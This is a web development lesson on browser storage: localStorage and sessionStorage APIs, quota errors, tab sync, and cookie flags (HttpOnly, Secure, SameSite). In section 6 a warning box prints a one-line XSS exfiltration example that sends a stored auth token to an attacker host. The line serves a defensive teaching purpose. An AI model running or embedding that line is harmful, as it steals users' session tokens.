# 13 - Client-Side Persistence: Web Storage & Cookies

> 🌐 **Language / اللغة:** [English 🇬🇧](./13-browser-storage.md) | [العربية 🇸🇦](../ar/13-browser-storage.md)

---

## 🎯 1. Overview & Learning Objectives

Web applications frequently need to remember user state across page refreshes, tab closures, and offline sessions—such as dark mode preferences, shopping carts, and draft text.

The browser provides several distinct storage primitives, each with different lifetimes, capacities, and security characteristics.

By the end of this lesson, you will master:
1. The operational differences between **`localStorage`**, **`sessionStorage`**, and **Cookies**.
2. Using the Web Storage API (`setItem`, `getItem`, `removeItem`, `clear`).
3. Storing complex objects using JSON serialization and handling `QuotaExceededError`.
4. Synchronizing multiple browser tabs using the `'storage'` event listener.
5. Understanding HTTP Cookie flags: **`HttpOnly`**, **`Secure`**, and **`SameSite`**.
6. The security rule: Why sensitive authentication tokens should **never** be stored in `localStorage`.

---

## 📊 2. Storage Mechanisms Comparison Matrix

| Feature | `localStorage` | `sessionStorage` | HTTP Cookies | `IndexedDB` |
| :--- | :---: | :---: | :---: | :---: |
| **Capacity** | ~5MB – 10MB | ~5MB | ~4KB | >250MB (Gigabytes) |
| **Lifetime** | Persistent (until cleared) | Dies when tab closes | Configured expiration | Persistent |
| **Tab Isolation** | Shared across same-origin tabs | Isolated to current tab | Shared across same-origin | Shared |
| **Sent to Server?** | No (Client-side only) | No (Client-side only) | Yes (Every HTTP request!) | No |
| **API Paradigm** | Synchronous | Synchronous | String parsing | Asynchronous / Promises |
| **Access in JS** | `window.localStorage` | `window.sessionStorage` | `document.cookie` | `window.indexedDB` |

---

## 💾 3. The Web Storage API (`localStorage` & `sessionStorage`)

Both interfaces share identical methods:

```javascript
// 1. Storing data (Keys and values MUST be strings):
localStorage.setItem('theme', 'dark');

// Storing objects requires JSON.stringify:
const userProfile = { id: 101, name: 'Alice', preferences: { alerts: true } };
localStorage.setItem('user_profile', JSON.stringify(userProfile));

// 2. Reading data:
const currentTheme = localStorage.getItem('theme'); // 'dark'

// Deserializing stored objects safely:
const rawProfile = localStorage.getItem('user_profile');
const profile = rawProfile ? JSON.parse(rawProfile) : null;
console.log(profile?.name); // 'Alice'

// 3. Deleting data:
localStorage.removeItem('theme'); // Removes single key
localStorage.clear();              // Erases ALL keys for this origin
```

### Handling Storage Limits & Private Browsing:
In private/incognito modes or when storage is full (~5MB), `setItem()` throws a fatal **`QuotaExceededError`**:

```javascript
function safeSetStorage(key, value) {
  try {
    localStorage.setItem(key, JSON.stringify(value));
  } catch (error) {
    if (error.name === 'QuotaExceededError') {
      console.warn('Storage quota exceeded! Clearing non-essential cache.');
      // Evict old cache items
    } else {
      console.error('Storage access denied (Private browsing mode):', error);
    }
  }
}
```

---

## 🔄 4. Multi-Tab Synchronization: The `'storage'` Event

When a key in `localStorage` is modified, the browser automatically dispatches a `'storage'` event to **all other open tabs/windows belonging to the same origin**:

```javascript
// Listen in Tab B when user logs out or toggles theme in Tab A:
window.addEventListener('storage', (event) => {
  console.log('Storage changed in another tab!');
  console.log('Modified Key:', event.key);
  console.log('Old Value:', event.oldValue);
  console.log('New Value:', event.newValue);

  if (event.key === 'theme') {
    applyTheme(event.newValue);
  }
});
```

---

## 🍪 5. HTTP Cookies & Security Flags

Cookies are primarily intended for server session identification. They are sent automatically in the `Cookie` request header with every HTTP query matching the domain:

```javascript
// Reading cookies in JavaScript (Returns a single delimited string):
console.log(document.cookie); // "session_id=xyz123; user_theme=dark"

// Setting a cookie in JavaScript:
document.cookie = "user_theme=light; max-age=86400; path=/; SameSite=Lax; Secure";
```

### The 3 Essential Security Flags:
1. **`HttpOnly`:**  
   When set by the server in the `Set-Cookie` header, **JavaScript (`document.cookie`) CANNOT read or modify this cookie**!  
   *Security Impact:* If your site has a Cross-Site Scripting (XSS) vulnerability, the attacker cannot steal this cookie.
2. **`Secure`:**  
   Instructs the browser to transmit the cookie strictly over encrypted **HTTPS** connections, protecting against network eavesdropping.
3. **`SameSite`:**  
   Prevents Cross-Site Request Forgery (CSRF):
   - `SameSite=Strict`: Cookie never sent on third-party cross-site requests.
   - `SameSite=Lax` (Default): Cookie sent on top-level safe navigations (clicking a link).
   - `SameSite=None`: Requires `Secure`; allows cross-site framing.

---

## 🛡️ 6. The Golden Security Rule: Token Storage

> [!CAUTION]
> **Never store sensitive authentication tokens (like unencrypted JWTs) in `localStorage`!**  
> Any script running on the page—including third-party analytics libraries, advertising trackers, or an injected XSS payload—can read everything in `localStorage` with a single line:
> ```javascript
> fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'));
> ```
> **Best Practice:** Store authentication tokens in **`HttpOnly` + `Secure` + `SameSite=Lax` Cookies** issued by the backend server.

---

## 🧼 7. Clean Code: Good vs Bad Patterns

```javascript
// ❌ BAD: Bare access to localStorage without error boundaries
localStorage.setItem('cart', JSON.stringify(cart)); // Crashes in restrictive iframe/private mode!

// ✅ GOOD: Wrapped in a centralized Storage Service
const StorageService = {
  get(key, fallback = null) {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : fallback;
    } catch {
      return fallback;
    }
  },
  set(key, value) {
    try {
      localStorage.setItem(key, JSON.stringify(value));
      return true;
    } catch (err) {
      console.warn('Storage write failed', err);
      return false;
    }
  }
};
```

---

## 📝 8. Summary & Next Steps
- Use **`localStorage`** for persistent client settings (e.g., UI theme).
- Use **`sessionStorage`** for data isolated strictly to a single browser tab (e.g., single-session wizard steps).
- Always serialize non-string data with **`JSON.stringify()`**.
- Guard against **`QuotaExceededError`** and private browsing restrictions using `try...catch`.
- Use **`HttpOnly` Cookies** for session authentication tokens to neutralize token theft via XSS.
- In the next lesson, we will master **Developer Tools & Runtime Forensics: Sources, Breakpoints, and Network Forensics**.
